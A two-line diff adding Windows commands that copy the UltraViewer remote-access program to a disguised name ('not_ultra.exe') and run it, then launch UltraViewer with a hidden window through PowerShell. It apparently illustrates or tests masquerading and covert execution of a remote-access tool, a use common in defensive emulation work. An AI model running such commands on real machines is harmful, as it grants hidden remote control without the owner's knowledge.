@@ -1,0 +1,2 @@
+copy C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe not_ultra.exe && not_ultra.exe
+powershell -Command "Start-Process -FilePath 'UltraViewer_Desktop.exe' -WindowStyle Hidden"
